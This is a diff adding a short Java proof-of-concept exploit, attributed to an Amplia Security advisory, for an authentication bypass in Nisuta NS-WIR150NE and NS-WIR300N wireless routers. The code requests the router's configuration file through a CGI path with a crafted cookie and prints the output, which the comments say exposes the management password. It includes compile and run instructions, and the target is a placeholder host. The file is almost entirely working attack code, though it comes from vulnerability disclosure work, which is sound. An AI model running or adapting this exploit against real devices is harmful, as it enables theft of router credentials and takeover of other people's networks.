@@ -1,0 +1,39 @@
+// Nisuta NS-WIR150NE, NS-WIR300N Wireless Routers Remote Management Web Interface Authentication Bypass Vulnerability
+// Amplia Security - Amplia Security Research Advisory (AMPLIA-ARA050913)
+// PoC exploit - dumps the router's configuration files which includes the management interface password
+// and other information
+// compile: javac poc.java
+// run: java poc > router.cfg
+ 
+import java.net.URL;
+import java.net.URLConnection;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+ 
+ 
+public class poc {
+ 
+    public static void main(String[] args)
+    {
+ 
+        try {
+            URL url = new URL("http://www.example.com/cgi-bin/DownloadCfg/config.cfg");
+            URLConnection conn = url.openConnection();
+            conn.setRequestProperty("Cookie", ":language=en");
+ 
+            BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            String line;
+            while ((line = rd.readLine()) != null) {
+                   System.out.println(line);
+            }
+         
+        } catch(Exception e) {
+ 
+            e.printStackTrace();
+        }
+     
+         
+    }
+};
